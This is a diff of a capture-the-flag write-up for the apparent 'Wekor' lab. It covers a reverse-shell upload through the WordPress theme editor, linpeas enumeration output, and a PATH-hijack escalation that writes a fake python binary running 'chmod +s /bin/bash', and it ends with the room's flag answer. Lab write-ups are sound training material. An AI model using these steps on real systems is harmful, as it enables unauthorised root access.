@@ -593,7 +593,6 @@ http://site.wekor.thm/wordpress/wp-admin/theme-editor.php?file=404.php&theme=twe
 
 upload a revshell like PentestMonkey or Ivan Sincek (bypass WAF and AV)
 
-
 https://www.revshells.com/
 
 I'm using Ivan Sincek
@@ -638,7 +637,6 @@ www-data@osboxes:/tmp$ ./linpeas.sh
 chmod +x linpeas.sh
 www-data@osboxes:/tmp$ ./linpeas.sh
 ./linpeas.sh
-
 
                             ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                     ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
@@ -700,8 +698,6 @@ Writable folder: /dev/shm
 [+] /bin/bash is available for network discovery, port scanning and port forwarding (linpeas can discover hosts, scan ports, and forward ports. Learn more with -h)
 [+] /bin/nc is available for network discovery & port scanning (linpeas can discover hosts and scan ports, learn more with -h)
 
-
-
 Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE
 
                               ╔════════════════════╗
@@ -723,7 +719,6 @@ Sudo version 1.8.16
 Vulnerable to CVE-2021-4034
 
 Potentially Vulnerable to CVE-2022-2588
-
 
 ╔══════════╣ USBCreator
 ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation
@@ -838,7 +833,6 @@ https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
    Download URL: 
    Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled
 
-
 ╔══════════╣ Executing Linux Exploit Suggester 2
 ╚ https://github.com/jondonas/linux-exploit-suggester-2
 
@@ -865,7 +859,6 @@ apparmor module is loaded.
 ╔══════════╣ Container details
 ═╣ Is this a container? ........... No
 ═╣ Any running containers? ........ No
-
 
                                      ╔═══════╗
 ═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════
@@ -903,13 +896,9 @@ PrivateIPv6s:
 Subnet IPv6: 
 Public IPv4s:
 
-
-
 ══╣ IAM Role
 
-
 ══╣ User Data
-
 
                 ╔════════════════════════════════════════════════╗
 ════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════
@@ -1083,7 +1072,6 @@ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
 47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
 52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
-
 
 SHELL=/bin/sh
 PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
@@ -1268,7 +1256,6 @@ org.freedesktop.thermald                     - -               -                
 org.freedesktop.timedate1                    - -               -                (activatable) -                         -         
 org.opensuse.CupsPkHelper.Mechanism          - -               -                (activatable) -                         -         
 
-
                               ╔═════════════════════╗
 ══════════════════════════════╣ Network Information ╠══════════════════════════════
                               ╚═════════════════════╝
@@ -1306,7 +1293,6 @@ lo        Link encap:Local Loopback
           collisions:0 txqueuelen:1000 
           RX bytes:114056 (114.0 KB)  TX bytes:114056 (114.0 KB)
 
-
 ╔══════════╣ Active Ports
 ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
 tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
@@ -1321,8 +1307,6 @@ tcp6       0      0 ::1:631                 :::*                    LISTEN      
 ╔══════════╣ Can I sniff with tcpdump?
 ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sniffing
 You can sniff with tcpdump!
-
-
 
                                ╔═══════════════════╗
 ═══════════════════════════════╣ Users Information ╠═══════════════════════════════
@@ -1420,8 +1404,6 @@ root             pts/18   192.168.0.1      Sun Jul 12 19:55:38 -0400 2020
 
 ╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
 
-
-
                              ╔══════════════════════╗
 ═════════════════════════════╣ Software Information ╠═════════════════════════════
                              ╚══════════════════════╝
@@ -1454,7 +1436,6 @@ ii  hardening-includes                        2.7ubuntu2                        
 
 ╔══════════╣ MySQL version
 mysql  Ver 14.14 Distrib 5.7.32, for Linux (i686) using  EditLine wrapper
-
 
 ═╣ MySQL connection using default root/root ........... No
 ═╣ MySQL connection using root/toor ................... No
@@ -1508,7 +1489,6 @@ lrwxrwxrwx 1 root root 35 Jul 12  2020 /etc/apache2/sites-enabled/000-default.co
 	CustomLog ${APACHE_LOG_DIR}/access.log combined
 </VirtualHost>
 
-
 -rw-r--r-- 1 root root 1332 Jun 15  2020 /etc/apache2/sites-available/000-default.conf
 <VirtualHost *:80>
 	ServerAdmin webmaster@localhost
@@ -1539,8 +1519,6 @@ ibase.allow_persistent = 1
 mysqli.allow_persistent = On
 pgsql.allow_persistent = On
 
-
-
 ╔══════════╣ Analyzing Wordpress Files (limit 70)
 -rw-rw-rw- 1 www-data www-data 3192 Jan 21  2021 /var/www/html/site.wekor.thm/wordpress/wp-config.php
 define( 'DB_NAME', 'wordpress' );
@@ -1567,16 +1545,13 @@ define( 'DB_HOST', 'localhost' );
 	refuse options = checksum dry-run
 	dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz
 
-
 ╔══════════╣ Analyzing Wifi Connections Files (limit 70)
 drwxr-xr-x 2 root root 4096 Nov  2  2018 /etc/NetworkManager/system-connections
 drwxr-xr-x 2 root root 4096 Nov  2  2018 /etc/NetworkManager/system-connections
 
-
 ╔══════════╣ Analyzing Ldap Files (limit 70)
 The password hash is from the {SSHA} to 'structural'
 drwxr-xr-x 2 root root 4096 Jan 20  2021 /etc/ldap
-
 
 ╔══════════╣ Searching ssl/ssh files
 Port 22
@@ -1597,7 +1572,6 @@ Subsystem	sftp	/usr/lib/openssh/sftp-server
 ══╣ /etc/hosts.allow file found, trying to read the rules:
 /etc/hosts.allow
 
-
 Searching inside /etc/ssh/ssh_config for interesting info
 Host *
     SendEnv LANG LC_*
@@ -1609,18 +1583,12 @@ Host *
 drwxr-xr-x 2 root root 4096 Jan 23  2021 /etc/pam.d
 -rw-r--r-- 1 root root 2133 May 26  2020 /etc/pam.d/sshd
 
-
 ╔══════════╣ Passwords inside pam.d
 /etc/pam.d/lightdm:auth    sufficient      pam_succeed_if.so user ingroup nopasswdlogin
-
-
 
 ╔══════════╣ Analyzing Keyring Files (limit 70)
 drwxr-xr-x 2 root root 4096 Feb 26  2019 /usr/share/keyrings
 drwxr-xr-x 2 root root 4096 Feb 26  2019 /var/lib/apt/keyrings
-
-
-
 
 ╔══════════╣ Searching uncommon passwd files (splunk)
 passwd file: /etc/pam.d/passwd
@@ -1644,90 +1612,26 @@ netpgp Not Found
 -rw-r--r-- 1 root root 2256 Feb 26  2016 /usr/share/popularity-contest/debian-popcon.gpg
 -rw-r--r-- 1 root root 12335 Feb 26  2019 /var/lib/apt/keyrings/ubuntu-archive-keyring.gpg
 
-
-
 ╔══════════╣ Analyzing Postfix Files (limit 70)
 -rw-r--r-- 1 root root 694 May 18  2016 /usr/share/bash-completion/completions/postfix
 
-
 ╔══════════╣ Analyzing FTP Files (limit 70)
-
 
 -rw-r--r-- 1 root root 69 May 26  2020 /etc/php/7.0/mods-available/ftp.ini
 -rw-r--r-- 1 root root 69 Oct  8  2020 /usr/share/php7.0-common/common/ftp.ini
 
-
-
-
-
-
 ╔══════════╣ Analyzing Windows Files (limit 70)
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 lrwxrwxrwx 1 root root 20 Jul 12  2020 /etc/alternatives/my.cnf -> /etc/mysql/mysql.cnf
 lrwxrwxrwx 1 root root 24 Jul 12  2020 /etc/mysql/my.cnf -> /etc/alternatives/my.cnf
 -rw-r--r-- 1 root root 81 Jan 20  2021 /var/lib/dpkg/alternatives/my.cnf
 
-
-
-
 -rw-r--r-- 1 root root 553164 Feb 18  2016 /usr/share/gutenprint/5.2/xml/printers.xml
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 ╔══════════╣ Analyzing Other Interesting Files (limit 70)
 -rw-r--r-- 1 root root 3771 Aug 31  2015 /etc/skel/.bashrc
 
-
-
-
-
 -rw-r--r-- 1 root root 655 May 16  2017 /etc/skel/.profile
-
-
-
-
-
 
                                ╔═══════════════════╗
 ═══════════════════════════════╣ Interesting Files ╠═══════════════════════════════
@@ -1952,7 +1856,6 @@ else:
 	print("Quitting...")
 	time.sleep(1)
 
-
 Orka@osboxes:~/Desktop$ file bitcoin
 file bitcoin
 bitcoin: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8280915d0ebb7225ed63f226c15cee11ce960b6b, not stripped
@@ -2064,7 +1967,6 @@ Orka@osboxes:/usr/sbin$ cat << EOF > python
 chmod +s /bin/bash
 EOF
 
-
 Orka@osboxes:/usr/sbin$ 
 Orka@osboxes:/usr/sbin$ cat python
 cat python
@@ -2162,11 +2064,7 @@ while 1:
 
 s.close()
 
-
-
 ```
-
-![[Pasted image 20230313112659.png]]
 
 What is the user flag?  
 
@@ -2179,6 +2077,5 @@ What is the root flag?
 Sudo -l
 
 *f4e788f87cc3afaecbaf0f0fe9ae6ad7*
-
 
 [[Revenge]]
